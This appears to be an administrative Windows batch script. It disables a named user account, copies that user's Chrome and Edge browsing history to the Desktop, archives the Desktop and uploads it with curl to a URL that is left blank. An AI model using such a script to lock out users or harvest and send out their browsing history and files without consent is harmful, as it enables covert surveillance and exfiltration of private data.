set username="%1"
set uploadurl=""

set mytime="%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
set zipname="%computername%-%username%-at-%mytime%.tgz"
echo %zipname%

net user /Active:No %username%

pushd "C:\Users\%username%\"
copy "AppData\Local\Google\Chrome\User Data\Default\History" "Desktop\Chrome-History-%mytime%.sqlite"
copy "AppData\Local\Microsoft\Edge\User Data\Default\History" "Desktop\Edge-History-%mytime%.sqlite"

pushd Desktop
tar -cvzf %zipname% --exclude Library --exclude "Unity Reference and Manual" .
curl -T %zipname% %uploadurl%
popd

popd
pause
